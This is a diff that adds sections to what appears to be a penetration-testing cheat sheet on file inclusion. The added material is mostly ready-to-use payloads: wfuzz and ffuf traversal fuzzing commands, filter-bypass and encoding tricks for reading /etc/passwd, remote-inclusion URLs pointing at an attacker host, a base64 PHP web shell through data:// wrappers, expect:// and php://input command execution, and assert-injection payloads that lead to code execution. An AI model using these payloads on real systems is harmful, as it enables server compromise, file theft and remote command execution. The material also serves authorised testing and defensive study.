@@ -34,11 +34,18 @@ LFI file lists
 Linux LFI file directories
 https://github.com/hussein98d/LFI-files
 
+wfuzz
 Then use the list to find out which ones work:
 $ wfuzz -u http://192.168.1.1:80/index.php/file=../../../../../../../../..FUZZ -w ./list.txt
 
 Find out how many characters a wrong request is, then filter those out:
 $ wfuzz -u http://192.168.1.1:80/index.php/file=../../../../../../../../..FUZZ -w ./list.txt -hh 1000
+
+ffuf
+The following sequence of commands allows the generation of payloads using sed (1) as input for url fuzzing tools such as ffuf (2):
+$ sed 's_^_../../../var/www/_g' /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-small.txt | sed 's_$_/../../../etc/passwd_g' > payloads.txt
+$ ffuf -u http://example.com/index.php?page=FUZZ -w payloads.txt -mr "root"
+
 ```
 
 ### Directory Traversal
@@ -210,4 +217,160 @@ The following log files are controllable and can be included with an evil payloa
 /var/log/sshd.log
 /var/log/mail
 ```
+
+## Traversal sequences stripped non-recursively
+```
+http://example.com/index.php?page=....//....//....//etc/passwd
+http://example.com/index.php?page=....\/....\/....\/etc/passwd
+http://some.domain.com/static/%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c/etc/passwd
+```
+
+## Null byte (%00)
+```
+Bypass the append more chars at the end of the provided string (bypass of: $_GET['param']."php")
+http://example.com/index.php?page=../../../etc/passwd%00
+This is solved since PHP 5.4
+```
+
+## Encoding
+```
+You could use non-standard encondings like double URL encode (and others):
+http://example.com/index.php?page=..%252f..%252f..%252fetc%252fpasswd
+http://example.com/index.php?page=..%c0%af..%c0%af..%c0%afetc%c0%afpasswd
+http://example.com/index.php?page=%252e%252e%252fetc%252fpasswd
+http://example.com/index.php?page=%252e%252e%252fetc%252fpasswd%00
+```
+
+## From existent folder
+```
+Maybe the back-end is checking the folder path:
+http://example.com/index.php?page=utils/scripts/../../../../../etc/passwd
+```
+
+## Identifying folders on a server
+```
+Depending on the applicative code / allowed characters, it might be possible to recursively explore the file system by discovering folders and not just files. In order to do so:
+identify the "depth" of you current directory by succesfully retrieving /etc/passwd (if on Linux):
+http://example.com/index.php?page=../../../etc/passwd # depth of 3
+
+try and guess the name of a folder in the current directory by adding the folder name (here, private), and then going back to /etc/passwd:
+http://example.com/index.php?page=private/../../../../etc/passwd # we went deeper down one level, so we have to go 3+1=4 levels up to go back to /etc/passwd 
+
+if the application is vulnerable, there might be two different outcomes to the request:
+if you get an error / no output, the private folder does not exist at this location
+if you get the content from /etc/passwd, you validated that there is indeed a privatefolder in your current directory
+the folder(s) you discovered using this techniques can then be fuzzed for files (using a classic LFI method) or for subdirectories using the same technique recursively.
+
+It is possible to adapt this technique to find directories at any location in the file system. For instance, if, under the same hypothesis (current directory at depth 3 of the file system) you want to check if /var/www/ contains a private directory, use the following payload:
+
+http://example.com/index.php?page=../../../var/www/private/../../../etc/passwd
+```
+
+## Path truncation
+```
+Bypass the append of more chars at the end of the provided string (bypass of: $_GET['param']."php")
+In PHP: /etc/passwd = /etc//passwd = /etc/./passwd = /etc/passwd/ = /etc/passwd/.
+Check if last 6 chars are passwd --> passwd/
+Check if last 4 chars are ".php" --> shellcode.php/.
+
+http://example.com/index.php?page=a/../../../../../../../../../etc/passwd..\.\.\.\.\.\.\.\.\.\.\[ADD MORE]\.\.
+http://example.com/index.php?page=a/../../../../../../../../../etc/passwd/././.[ADD MORE]/././.
+
+#With the next options, by trial and error, you have to discover how many "../" are needed to delete the appended string but not "/etc/passwd" (near 2027)
+
+http://example.com/index.php?page=a/./.[ADD MORE]/etc/passwd
+http://example.com/index.php?page=a/../../../../[ADD MORE]../../../../../etc/passwd
+
+Always try to start the path with a fake directory (a/).
+This vulnerability was corrected in PHP 5.3.
+```
+
+##  Filter Bypass Tricks
+```
+http://example.com/index.php?page=....//....//etc/passwd
+http://example.com/index.php?page=..///////..////..//////etc/passwd
+http://example.com/index.php?page=/%5C../%5C../%5C../%5C../%5C../%5C../%5C../%5C../%5C../%5C../%5C../etc/passwd
+Maintain the initial path: http://example.com/index.php?page=/var/www/../../etc/passwd
+```
+
+## Basic RFI
+```
+http://example.com/index.php?page=http://atacker.com/mal.php
+http://example.com/index.php?page=\\attacker.com\shared\mal.php
+```
+
+## Top 25 Parameters
+```
+Here’s list of top 25 parameters that could be vulnerable to local file inclusion (LFI) vulnerabilities
+?cat={payload}
+?dir={payload}
+?action={payload}
+?board={payload}
+?date={payload}
+?detail={payload}
+?file={payload}
+?download={payload}
+?path={payload}
+?folder={payload}
+?prefix={payload}
+?include={payload}
+?page={payload}
+?inc={payload}
+?locate={payload}
+?show={payload}
+?doc={payload}
+?site={payload}
+?type={payload}
+?view={payload}
+?content={payload}
+?document={payload}
+?layout={payload}
+?mod={payload}
+?conf={payload}
+```
+
+## LFI / RFI using PHP wrappers & protocols
+```
+php://filter
+PHP filters allow perform basic modification operations on the data before being it's read or written. There are 5 categories of filters:
+
+data://
+http://example.net/?page=data://text/plain,<?php echo base64_encode(file_get_contents("index.php")); ?>
+http://example.net/?page=data://text/plain,<?php phpinfo(); ?>
+http://example.net/?page=data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7ZWNobyAnU2hlbGwgZG9uZSAhJzsgPz4=
+http://example.net/?page=data:text/plain,<?php echo base64_encode(file_get_contents("index.php")); ?>
+http://example.net/?page=data:text/plain,<?php phpinfo(); ?>
+http://example.net/?page=data:text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7ZWNobyAnU2hlbGwgZG9uZSAhJzsgPz4=
+NOTE: the payload is "<?php system($_GET['cmd']);echo 'Shell done !'; ?>"
+
+PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7ZWNobyAnU2hlbGwgZG9uZSAhJzsgPz4 <----- payload 
+
+Fun fact: you can trigger an XSS and bypass the Chrome Auditor with : http://example.com/index.php?page=data:application/x-httpd-php;base64,PHN2ZyBvbmxvYWQ9YWxlcnQoMSk+
+
+expect://
+Expect has to be activated. You can execute code using this.
+http://example.com/index.php?page=expect://id
+http://example.com/index.php?page=expect://ls
+
+input://
+Specify your payload in the POST parameters
+http://example.com/index.php?page=php://input
+POST DATA: <?php system('id'); ?>
+```
+
+## LFI via PHP's 'assert'
+```
+If you encounter a difficult LFI that appears to be filtering traversal strings such as ".." and responding with something along the lines of "Hacking attempt" or "Nice try!", an 'assert' injection payload may work.
+
+A payload like this:
+' and die(show_source('/etc/passwd')) or '
+will successfully exploit PHP code for a "file" parameter that looks like this:
+assert("strpos('$file', '..') === false") or die("Detected hacking attempt!");
+
+It's also possible to get RCE in a vulnerable "assert" statement using the system() function:
+' and die(system("whoami")) or '
+Be sure to URL-encode payloads before you send them.
+```
+
+
 
